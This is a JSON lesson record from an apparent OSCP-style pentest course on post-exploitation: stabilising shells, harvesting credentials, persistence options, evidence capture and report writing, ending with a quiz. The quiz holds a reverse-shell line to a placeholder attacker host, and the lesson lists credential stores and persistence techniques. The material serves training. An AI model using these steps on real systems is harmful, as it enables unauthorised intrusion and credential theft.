{
  "lesson_id": "f48ca9db-0fcd-44f9-9c3e-7d3bf626e707",
  "domain": "pentest",
  "title": "Post-Exploitation Operations and Reporting",
  "subtitle": "Stabilising access, harvesting evidence, and writing exam-ready reports",
  "difficulty": 2,
  "estimated_time": 70,
  "order_index": 29,
  "author": "CyberLearn Offensive Curriculum Team",
  "base_xp_reward": 180,
  "mastery_threshold": 78,
  "is_core_concept": true,
  "created_at": "2025-01-20T12:00:00",
  "updated_at": "2025-01-20T12:00:00",
  "version": "1.0",
  "prerequisites": [
    "Pivoting",
    "Credential Operations"
  ],
  "concepts": [
    "Stabilising shells",
    "Credential harvesting",
    "Data exfiltration planning",
    "Evidence collection",
    "Persistence tradecraft",
    "Cleanup procedures",
    "Reporting structure",
    "Remediation guidance"
  ],
  "learning_objectives": [
    "Stabilise access and maintain control without breaking scope",
    "Collect high-value data and credentials ethically",
    "Plan minimal, documented persistence options for lab practice",
    "Organise notes and screenshots into report-ready material",
    "Deliver clear remediation steps aligned with business risk"
  ],
  "jim_kwik_principles": [
    "Active recall",
    "Teach to learn"
  ],
  "content_blocks": [
    {
      "block_id": "c0c20f38-2414-491d-a225-697d15afa6aa",
      "type": "explanation",
      "title": "Post-Exploitation Mindset",
      "content": {
        "text": "# After the Shell\n\nExploitation grants you access; post-exploitation proves impact. In PWK labs and the OSCP exam, you must harvest evidence responsibly, maintain stability, and document everything. Your guiding principles:\n\n- Respect scope: only access approved systems and data.\n- Prioritise business impact: focus on credentials, sensitive files, and system control.\n- Prepare to report: every action must translate into a clear narrative.\n\nThis lesson covers stabilising sessions, gathering artifacts, and shaping them into a compelling report."
      },
      "simplified_explanation": "Post-exploitation is about proving impact while respecting scope and documentation.",
      "memory_aids": [
        "Impact over curiosity."
      ],
      "real_world_connection": "Professional assessments succeed when reports show exactly what was accessed and how.",
      "reflection_prompt": "How do you currently prioritise targets after gaining a shell?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "4c9bc21e-1c1a-4bdf-a120-9b23b543622d",
      "type": "explanation",
      "title": "Stabilising and Maintaining Access",
      "content": {
        "text": "# Shell Management\n\n- Upgrade shells to stable TTYs using `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` and `stty raw -echo`.\n- Use `rlwrap` or tmux sessions to maintain command history.\n- For Windows, prefer `evil-winrm`, `psexec`, or `smbexec` for stable interactive access.\n\n## Persistence Considerations\n\nIn exams you should avoid long-term persistence, but understand techniques:\n- Scheduled tasks or cron jobs launching call-backs.\n- Registry Run keys or systemd service units.\n- SSH authorised_keys insertion.\n\nDocument potential persistence options even if you do not deploy them, demonstrating understanding without violating scope."
      },
      "simplified_explanation": "Stabilise shells and understand persistence without abusing it in exams.",
      "memory_aids": [
        "Stabilise, then strategise"
      ],
      "real_world_connection": "Clients appreciate when testers explain what persistence would look like without deploying it.",
      "reflection_prompt": "Which persistence vector would you recommend if a client asked for red team readiness?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "61ee6d16-9678-483a-af4e-1fda9acd6725",
      "type": "explanation",
      "title": "Data and Credential Harvesting",
      "content": {
        "text": "# High-Value Targets\n\n- Windows: C:\\Users\\*\\Desktop, DPAPI secrets, LSASS memory (when allowed), cached GPP passwords.\n- Linux: /etc/passwd, /etc/shadow, /var/backups, SSH keys, configuration files.\n- Applications: database connection strings, API keys, config.php files.\n\n## Exfiltration Planning\n\n- Only collect data necessary to prove access.\n- Use compression (tar, zip) and encryption when moving data across lab boundaries.\n- Record hashes of files taken to validate integrity and support cleanup.\n\nAlways annotate where data came from and how it will be returned or destroyed."
      },
      "simplified_explanation": "Prioritise credentials and sensitive configs while limiting scope of exfiltration.",
      "memory_aids": [
        "Credentials + configs"
      ],
      "real_world_connection": "Incident response teams rely on your detailed notes to verify what was accessed.",
      "reflection_prompt": "How will you prove you accessed sensitive data without over-collecting?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "1bad2e83-026a-41d6-b290-9bd26e8eea30",
      "type": "explanation",
      "title": "Evidence and Reporting Workflow",
      "content": {
        "text": "# Evidence Capture\n\n- Take screenshots of commands that prove exploitation and impact (e.g., proof.txt, sensitive data).\n- Record timestamps, hostnames, and command outputs.\n- Use script logging (script command on Linux, Start-Transcript in PowerShell) to capture sessions.\n\n## Reporting Structure\n\nOrganise your report sections:\n1. Executive Summary: business impact and risk rating.\n2. Technical Findings: steps to exploit, evidence, affected assets.\n3. Remediation: actionable recommendations.\n4. Appendix: command logs, tool versions, proof screenshots.\n\nStart templating your report early; populating during engagement saves time before deadlines."
      },
      "simplified_explanation": "Capture evidence meticulously and structure reports into summary, findings, remediation, appendix.",
      "memory_aids": [
        "Evidence now, report faster later."
      ],
      "real_world_connection": "OSCP exam requires detailed report with replicable steps and screenshots.",
      "reflection_prompt": "What template or tooling do you use to capture evidence during labs?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "4ff9424c-fd70-499d-b1b7-245b38d3982f",
      "type": "code_exercise",
      "title": "Shell Stabilisation Drill",
      "content": {
        "text": "Practise stabilising shells on a Linux target:\n\n1. Exploit a lab box to obtain a netcat shell.\n2. Run `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` to upgrade.\n3. Background the shell with Ctrl+Z, then on your terminal run `stty raw -echo; fg` and `reset`.\n4. Export environment variables TERM=xterm-256color for readability.\n5. Log the session with `script -af postex.log`.\n\nReflect on latency, command history, and reliability improvements."
      },
      "simplified_explanation": "Upgrade simple shells into interactive TTYs and log the session.",
      "memory_aids": [],
      "real_world_connection": "Stable shells prevent mistakes when editing files or running sudo.",
      "reflection_prompt": "Which step in the stabilisation sequence do you forget most often?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "ff7fb761-6872-4fa5-92a0-7615cc7654f5",
      "type": "code_exercise",
      "title": "Evidence Capture Automation",
      "content": {
        "text": "Build a script to snapshot critical evidence:\n\n```bash\n#!/bin/bash\nHOST=$(hostname)\nOUTDIR=$1\nmkdir -p \"$OUTDIR/$HOST\"\ndate > \"$OUTDIR/$HOST/timestamp.txt\"\nwhoami > \"$OUTDIR/$HOST/whoami.txt\"\nip addr show > \"$OUTDIR/$HOST/ip.txt\"\nif [ -f /root/proof.txt ]; then\n  cp /root/proof.txt \"$OUTDIR/$HOST/proof.txt\"\nfi\n```\n\n- Execute with `./capture.sh evidence` and sync results back securely.\n- Extend to gather registry exports or event logs on Windows using PowerShell.\n\nAutomating evidence collection reduces manual errors during exams."
      },
      "simplified_explanation": "Automate gathering key evidence files into a structured folder.",
      "memory_aids": [],
      "real_world_connection": "Automation ensures nothing is missed during high-pressure reporting windows.",
      "reflection_prompt": "What additional artifacts should your script collect for Windows hosts?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "eab329bb-ac66-45fb-b3d2-23a99d78ac9b",
      "type": "code_exercise",
      "title": "Report Template Creation",
      "content": {
        "text": "Create a reusable OSCP-style report template:\n\n1. Set up a Markdown or LaTeX document with sections: Executive Summary, Methodology, Findings, Remediation, Appendix.\n2. Include tables for vulnerability details (Impact, Likelihood, CVSS, Evidence).\n3. Embed placeholders for screenshots (e.g., ![Proof](images/host-proof.png)).\n4. Automate PDF export with pandoc or mdpdf.\n\nPopulate the template with data from a recent lab box to test the workflow."
      },
      "simplified_explanation": "Build a report template so you can drop in evidence quickly.",
      "memory_aids": [],
      "real_world_connection": "Efficient reporting differentiates successful consultants.",
      "reflection_prompt": "Which section of your report template requires more sample text or guidance?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "4dc106fa-aefc-419d-8a27-53b32aebc9df",
      "type": "real_world",
      "title": "Case Study: Executive Reporting Win",
      "content": {
        "text": "A security consultancy compromised a finance server, extracted payroll spreadsheets, and escalated to domain admin. The final report included clear screenshots, timeline of actions, and remediation mapping to CIS Controls. Executives appreciated the actionable summary and funded a privileged access management project. The engagement shows that strong reporting converts technical victories into business change."
      },
      "simplified_explanation": "Clear reporting drives executive action on remediation.",
      "memory_aids": [
        "Great reports drive change"
      ],
      "real_world_connection": "",
      "reflection_prompt": "How will you translate technical jargon into executive language?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "6ac4d20e-8ce5-4e07-9c8b-a8120f9c5607",
      "type": "memory_aid",
      "title": "Mnemonic: TRACE",
      "content": {
        "text": "Use TRACE to remember post-exploitation workflow:\n\n- **T**ake control (stabilise shells)\n- **R**etrieve credentials and data\n- **A**nnotate evidence immediately\n- **C**lean up artifacts and maintain integrity\n- **E**xplain impact in the report\n\nReference TRACE at the end of every lab session."
      },
      "simplified_explanation": "TRACE keeps post-exploitation structured.",
      "memory_aids": [
        "Take, Retrieve, Annotate, Clean, Explain"
      ],
      "real_world_connection": "",
      "reflection_prompt": "Which TRACE step do you rush through when time is short?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "7b6273d4-f7e0-40d2-bb1f-9e1ccfc13831",
      "type": "diagram",
      "title": "Reporting Pipeline",
      "content": {
        "text": "```\nExploit --> Stabilise --> Gather Evidence --> Draft Findings --> Final Report\n     |          |              |                |              |\n  Proof.txt   TTY upgrade   Screenshots     Risk rating     PDF delivery\n  Credentials Persistence   Logs            Remediation     Client briefing\n```"
      },
      "simplified_explanation": "Visualise progression from exploitation to final report.",
      "memory_aids": [
        "Pipeline ensures nothing is missed."
      ],
      "real_world_connection": "",
      "reflection_prompt": "Where will you store intermediate notes to avoid losing context?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "0fc2dbe5-b3ab-445f-b94f-1e41f00ecdb9",
      "type": "mindset_coach",
      "title": "Document to Dominate",
      "content": {
        "text": "When fatigue hits, remind yourself: documentation equals impact. Future you\u2014and your exam proctor\u2014depend on clear notes. Take five-minute breaks to summarise progress, capture screenshots, and update your TRACE checklist."
      },
      "simplified_explanation": "Use micro-breaks to keep documentation sharp.",
      "memory_aids": [
        "Notes win exams."
      ],
      "real_world_connection": "Top OSCP scorers attribute success to disciplined note-taking.",
      "reflection_prompt": "What time-bound ritual will you adopt to update notes during engagements?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "cdc983d0-2fec-4d7b-ba04-d5c9ccb350d7",
      "type": "reflection",
      "title": "Post-Exploitation Retrospective",
      "content": {
        "text": "After each lab machine consider:\n\n- Did you stabilise access effectively?\n- Which credentials or data proved impact?\n- What artifacts require cleanup before exiting?\n- How will you describe the finding to both engineers and executives?\n- What remediation advice did you record?\n\nUpdate your TRACE checklist with answers."
      },
      "simplified_explanation": "Review stability, impact data, cleanup, communication, and remediation.",
      "memory_aids": [],
      "real_world_connection": "",
      "reflection_prompt": "Which question reveals the biggest gap in your current reporting process?",
      "is_interactive": false,
      "xp_reward": 0
    }
  ],
  "post_assessment": [
    {
      "question": "Which Linux command sequence upgrades a basic reverse shell to an interactive TTY?",
      "options": [
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' followed by stty raw -echo",
        "nc -lvnp 4444",
        "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
        "socat TCP-LISTEN:4444,fork TCP:TARGET:22"
      ],
      "correct_answer": 0,
      "explanation": "Upgrading with python pty.spawn and adjusting terminal settings provides an interactive TTY for stable post-exploitation.",
      "question_id": "476b7f05-57be-4b50-a284-d3585909b6fa",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What is the primary reason to capture hashes and metadata for any files you exfiltrate during an engagement?",
      "options": [
        "To crack the passwords faster",
        "To verify integrity and support secure deletion after the assessment",
        "To automatically populate the final report",
        "To avoid antivirus detection"
      ],
      "correct_answer": 1,
      "explanation": "Recording hashes confirms integrity, aids chain-of-custody, and ensures you can verify cleanup.",
      "question_id": "0778e899-e2d4-41a3-9b34-90593edb9b85",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which section of an OSCP report should summarise business impact in non-technical language?",
      "options": [
        "Appendix",
        "Executive Summary",
        "Methodology",
        "Technical Findings"
      ],
      "correct_answer": 1,
      "explanation": "The Executive Summary explains impact and risk in terms stakeholders understand.",
      "question_id": "59f6f7a7-914d-4d96-89d8-1bc697f82b2e",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ]
}